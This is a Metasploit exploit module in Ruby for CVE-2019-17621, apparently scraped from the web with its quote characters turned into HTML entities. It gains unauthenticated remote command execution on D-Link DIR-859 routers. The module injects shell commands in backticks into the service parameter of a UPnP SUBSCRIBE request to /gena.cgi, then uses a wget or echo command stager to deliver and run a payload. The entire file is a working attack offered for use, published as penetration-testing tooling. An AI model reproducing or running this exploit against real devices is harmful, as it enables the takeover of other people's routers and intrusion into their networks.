# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;D-Link DIR-859 Unauthenticated Remote Command Execution&#039;,
      &#039;Description&#039; => %q{
        D-Link DIR-859 Routers are vulnerable to OS command injection via the UPnP
        interface. The vulnerability exists in /gena.cgi (function genacgi_main() in
        /htdocs/cgibin), which is accessible without credentials.
      },
      &#039;Author&#039;      =>
        [
          &#039;Miguel Mendez Z., @s1kr10s&#039;, # Vulnerability discovery and initial exploit
          &#039;Pablo Pollanco P.&#039; # Vulnerability discovery and metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;CVE&#039;, &#039;2019-17621&#039; ],
          [ &#039;URL&#039;, &#039;https://medium.com/@s1kr10s/d94b47a15104&#039; ]
        ],
      &#039;DisclosureDate&#039; => &#039;Dec 24 2019&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;        => ARCH_MIPSBE,
      &#039;DefaultOptions&#039; =>
        {
            &#039;CMDSTAGER::FLAVOR&#039; => &#039;wget&#039;,
            &#039;RPORT&#039; => &#039;49152&#039;
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;,  { } ],
        ],
      &#039;CmdStagerFlavor&#039; => %w{ echo wget },
      &#039;DefaultTarget&#039;  => 0,
      ))

  end

  def execute_command(cmd, opts)
    callback_uri = "http://192.168.0." + Rex::Text.rand_text_hex(2).to_i(16).to_s +
      ":" + Rex::Text.rand_text_hex(4).to_i(16).to_s +
      "/" + Rex::Text.rand_text_alpha(3..12)
    begin
      send_request_raw({
        &#039;uri&#039;  => "/gena.cgi?service=`#{cmd}`",
        &#039;method&#039; =>  &#039;SUBSCRIBE&#039;,
        &#039;headers&#039; =>
        {
                &#039;Callback&#039; => "<#{callback_uri}>",
                &#039;NT&#039; => &#039;upnp:event&#039;,
                &#039;Timeout&#039; => &#039;Second-1800&#039;,
        },
      })
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{rhost}:#{rport} - Could not connect to the webservice")
    end
  end

  def exploit
    execute_cmdstager(linemax: 500)
  end
end

